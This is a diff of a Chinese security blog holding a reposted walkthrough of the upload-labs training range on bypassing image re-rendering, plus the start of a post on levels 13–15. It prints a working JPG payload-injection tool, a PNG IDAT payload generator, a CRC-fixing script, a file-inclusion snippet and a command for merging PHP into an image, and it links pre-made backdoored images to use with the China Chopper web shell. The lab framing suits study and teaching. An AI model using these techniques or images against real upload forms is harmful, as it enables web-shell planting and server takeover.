@@ -71,6 +71,165 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-33" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/03/01/page-33/" class="article-date">
+  <time class="dt-published" datetime="2021-03-01T14:29:00.000Z" itemprop="datePublished">2021-03-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/03/01/page-33/">十六看懂了</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p><a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">upload-labs</a>,是一个关于文件上传的靶场.具体的write-up社区里也都有<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2435">文章</a>.<br>不过我在看了pass-16的源码后,发现了一些有意思的东西.</p>
+<h2 id="分析问题"><a href="#分析问题" class="headerlink" title="分析问题"></a>分析问题</h2><p>关于检测gif的代码</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084054-2fdf5136-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084054-2fdf5136-ab24-1.png" alt="img"></a></p>
+<p>第71行检测<code>$fileext</code>和<code>$filetype</code>是否为gif格式.</p>
+<p>然后73行使用<code>move_uploaded_file</code>函数来做判断条件,如果成功将文件移动到<code>$target_path</code>,就会进入二次渲染的代码,反之上传失败.</p>
+<p>在这里有一个问题,如果作者是想考察绕过二次渲染的话,在<code>move_uploaded_file($tmpname,$target_path)</code>返回true的时候,就已经成功将图片马上传到服务器了,所以下面的二次渲染并不会影响到图片马的上传.如果是想考察文件后缀和<code>content-type</code>的话,那么二次渲染的代码就很多余.(到底考点在哪里,只有作者清楚.哈哈)</p>
+<p>由于在二次渲染时重新生成了文件名,所以可以根据上传后的文件名,来判断上传的图片是二次渲染后生成的图片还是直接由<code>move_uploaded_file</code>函数移动的图片.</p>
+<p>我看过的writeup都是直接由<code>move_uploaded_file</code>函数上传的图片马.今天我们把<code>move_uploaded_file</code>这个判断条件去除,然后尝试上传图片马.</p>
+<h2 id="上传gif"><a href="#上传gif" class="headerlink" title="上传gif"></a>上传gif</h2><p>将<code>&lt;?php phpinfo(); ?&gt;</code>添加到111.gif的尾部.</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084054-30088bb4-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084054-30088bb4-ab24-1.png" alt="img"></a></p>
+<p>成功上传含有一句话的111.gif,但是这并没有成功.我们将上传的图片下载到本地.<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084054-30124a96-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084054-30124a96-ab24-1.png" alt="img"></a></p>
+<p>可以看到下载下来的文件名已经变化,所以这是经过二次渲染的图片.我们使用16进制编辑器将其打开.<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084054-301ef28c-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084054-301ef28c-ab24-1.png" alt="img"></a></p>
+<p>可以发现,我们在gif末端添加的php代码已经被去除.</p>
+<p>关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了.</p>
+<p>经过对比,蓝色部分是没有发生变化的,<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-3034afe6-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-3034afe6-ab24-1.png" alt="img"></a></p>
+<p>我们将代码写到该位置.<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30462ed8-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30462ed8-ab24-1.png" alt="img"></a></p>
+<p>上传后在下载到本地使用16进制编辑器打开<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-3059bb06-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-3059bb06-ab24-1.png" alt="img"></a></p>
+<p>可以看到php代码没有被去除.成功上传图片马</p>
+<h2 id="上传png"><a href="#上传png" class="headerlink" title="上传png"></a>上传png</h2><p>png的二次渲染的绕过并不能像gif那样简单.</p>
+<h3 id="png文件组成"><a href="#png文件组成" class="headerlink" title="png文件组成"></a>png文件组成</h3><p>png图片由3个以上的数据块组成.</p>
+<p>PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了3个标准数据块(IHDR,IDAT, IEND)，每个PNG文件都必须包含它们.</p>
+<p>数据块结构<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-3065c234-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-3065c234-ab24-1.png" alt="img"></a></p>
+<p>CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC具体算法定义在ISO 3309和ITU-T V.42中，其值按下面的CRC码生成多项式进行计算：</p>
+<p>x32+x26+x23+x22+x16+x12+x11+x10+x8+x7+x5+x4+x2+x+1</p>
+<h3 id="分析数据块"><a href="#分析数据块" class="headerlink" title="分析数据块"></a>分析数据块</h3><h4 id="IHDR"><a href="#IHDR" class="headerlink" title="IHDR"></a>IHDR</h4><p>数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p>
+<p>文件头数据块由13字节组成，它的格式如下图所示。<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30748058-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30748058-ab24-1.png" alt="img"></a></p>
+<h4 id="PLTE"><a href="#PLTE" class="headerlink" title="PLTE"></a>PLTE</h4><p>调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。</p>
+<h4 id="IDAT"><a href="#IDAT" class="headerlink" title="IDAT"></a>IDAT</h4><p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p>
+<p>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像</p>
+<h4 id="IEND"><a href="#IEND" class="headerlink" title="IEND"></a>IEND</h4><p>图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p>
+<p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p>
+<p>00 00 00 00 49 45 4E 44 AE 42 60 82</p>
+<h3 id="写入php代码"><a href="#写入php代码" class="headerlink" title="写入php代码"></a>写入php代码</h3><p>在网上找到了两种方式来制作绕过二次渲染的png木马.</p>
+<h4 id="写入PLTE数据块"><a href="#写入PLTE数据块" class="headerlink" title="写入PLTE数据块"></a>写入PLTE数据块</h4><p>php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以再chunk data域插入php代码,然后重新计算相应的crc值并修改即可.</p>
+<p>这种方式只针对索引彩色图像的png图片才有效,在选取png图片时可根据IHDR数据块的color type辨别.<code>03</code>为索引彩色图像.</p>
+<ol>
+<li>在PLTE数据块写入php代码.<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30847062-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30847062-ab24-1.png" alt="img"></a></li>
+<li>计算PLTE数据块的CRC<br>CRC脚本</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">png = open(r&#x27;2.png&#x27;,&#x27;rb&#x27;)</span><br><span class="line">a = png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr = binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27; PLTE crc &#x27;&#x27;&#x27;</span><br><span class="line">data =  &#x27;504c5445&#x27;+ re.findall(&#x27;504c5445(.*?)49444154&#x27;,hexstr)[0]</span><br><span class="line">crc = binascii.crc32(data[:-16].decode(&#x27;hex&#x27;)) &amp; 0xffffffff</span><br><span class="line">print hex(crc)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">526579b0</span><br></pre></td></tr></table></figure>
+
+<p>3.修改CRC值</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30948bfa-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30948bfa-ab24-1.png" alt="img"></a></p>
+<p>4.验证<br>将修改后的png图片上传后,下载到本地打开<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30a39e2e-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30a39e2e-ab24-1.png" alt="img"></a></p>
+<h4 id="写入IDAT数据块"><a href="#写入IDAT数据块" class="headerlink" title="写入IDAT数据块"></a>写入IDAT数据块</h4><p>这里有国外大牛写的脚本,直接拿来运行即可.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">           0x66, 0x44, 0x50, 0x33);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+1];</span><br><span class="line">   $b = $p[$y+2];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,&#x27;./1.png&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行后得到1.png.上传后下载到本地打开如下图</p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30b19aec-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30b19aec-ab24-1.png" alt="img"></a></p>
+<h2 id="上传jpg"><a href="#上传jpg" class="headerlink" title="上传jpg"></a>上传jpg</h2><p>这里也采用国外大牛编写的脚本jpg_payload.php.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    /*</span><br><span class="line"></span><br><span class="line">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="line">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="line"></span><br><span class="line">    1) Upload an arbitrary image via secured files upload script</span><br><span class="line">    2) Save the processed image and launch:</span><br><span class="line">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line"></span><br><span class="line">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="line">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="line">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="line">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="line"></span><br><span class="line">    Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">    See also:</span><br><span class="line">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="line"></span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;</span><br><span class="line">        die(&#x27;php-gd is not installed&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!isset($argv[1])) &#123;</span><br><span class="line">        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">    for($pad = 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = new DataInputStream($argv[1]);</span><br><span class="line">        $outStream = file_get_contents($argv[1]);</span><br><span class="line">        $extraBytes = 0;</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line"></span><br><span class="line">        if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">            die(&#x27;Incorrect SOI marker&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - 2;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            if($marker === 0xDA) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, 0, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">                if($extraBytes !== 0) &#123;</span><br><span class="line">                    while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">                            if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">                                break;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, 0, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            0,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; elseif($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;</span><br><span class="line">                    die(&#x27;Success!&#x27;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(&#x27;payload_&#x27;.$argv[1]);</span><br><span class="line">    die(&#x27;Something\&#x27;s wrong&#x27;);</span><br><span class="line"></span><br><span class="line">    function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">        global $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        if($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        return $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">        global $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = FALSE;</span><br><span class="line">        if(preg_match(&#x27;/(\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;</span><br><span class="line">            if(isset($m[1])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class DataInputStream &#123;</span><br><span class="line">        private $binData;</span><br><span class="line">        private $order;</span><br><span class="line">        private $size;</span><br><span class="line"></span><br><span class="line">        public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">            $this-&gt;binData = &#x27;&#x27;;</span><br><span class="line">            $this-&gt;order = $order;</span><br><span class="line">            if(!$fromString) &#123;</span><br><span class="line">                if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);</span><br><span class="line">                $this-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function seek() &#123;</span><br><span class="line">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function skip($skip) &#123;</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readByte() &#123;</span><br><span class="line">            if($this-&gt;eof()) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">            return ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readShort() &#123;</span><br><span class="line">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">            if($this-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">            &#125;</span><br><span class="line">            return $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function eof() &#123;</span><br><span class="line">            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用方法</p>
+<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>随便找一个jpg图片,先上传至服务器然后再下载到本地保存为<code>1.jpg</code>.</p>
+<h3 id="插入php代码"><a href="#插入php代码" class="headerlink" title="插入php代码"></a>插入php代码</h3><p>使用脚本处理<code>1.jpg</code>,命令<code>php jpg_payload.php 1.jpg</code><br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30bb4236-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30bb4236-ab24-1.png" alt="img"></a><br>使用16进制编辑器打开,就可以看到插入的php代码.<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30c860b0-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30c860b0-ab24-1.png" alt="img"></a></p>
+<h3 id="上传图片马"><a href="#上传图片马" class="headerlink" title="上传图片马"></a>上传图片马</h3><p>将生成的<code>payload_1.jpg</code>上传.<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30d3a1a0-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30d3a1a0-ab24-1.png" alt="img"></a></p>
+<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>将上传的图片再次下载到本地,使用16进制编辑器打开<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30e17b68-ab24-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30e17b68-ab24-1.png" alt="img"></a></p>
+<p>可以看到,php代码没有被去除.<br>证明我们成功上传了含有php代码的图片.</p>
+<p>需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片.</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/notice">https://xz.aliyun.com/notice</a>)</p>
+<p>转载自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-7">https://xz.aliyun.com/t/2657#toc-7</a>  实在是看不懂之后再研究一下</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1mkiyUkiwLtPN9_y_sPGXBA">https://pan.baidu.com/s/1mkiyUkiwLtPN9_y_sPGXBA</a> 提取码：aaaa</p>
+<p><strong>其实这关就是要绕过二次渲染 然后用十六进制编辑器编辑一下</strong></p>
+<p><strong>先找一下上传到服务器上的图片和本地图片不变的代码是那一部分然后就可以把后门代码编辑进去就可成功上传</strong></p>
+<p><strong>链接里的文件是大佬 o(<em>^▽^</em>)┛已经制作好了的图片可以直接使用</strong></p>
+<p><strong>然后配合漏洞菜刀使用即可</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/03/01/page-33/" data-id="ckuzhneyu0015v4w7hplb9ftr" data-title="十六看懂了" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-32" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/03/01/page-32/" class="article-date">
+  <time class="dt-published" datetime="2021-03-01T10:14:42.000Z" itemprop="datePublished">2021-03-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/03/01/page-32/">uplolalabs&#39;13 14 15</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>第十三关   需要上传一个图片马</strong> 但是呢要图片马可以使用必须得服务器先能解析图片马 </p>
+<p>那么就得先上传一个简单的漏洞aaa.php    这个是漏洞代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个代码的意思是需要引用其他的应用程序然后它也不管是什么全当成php来解析</p>
+<p>然后需要往一个jpg里面嵌入后门代码 放图片和代码的位置cmd</p>
+<p>copy 1.jpg/b + 1.php/a 2.jpg 合并后会生成一个2.jpg 或者也可以直接嵌入1.jpg 这个/b 指定以二进制格式复制 /a指定以ASCII格式复制 图片不能用ascii复制不然到时候生成的图片打不开</p>
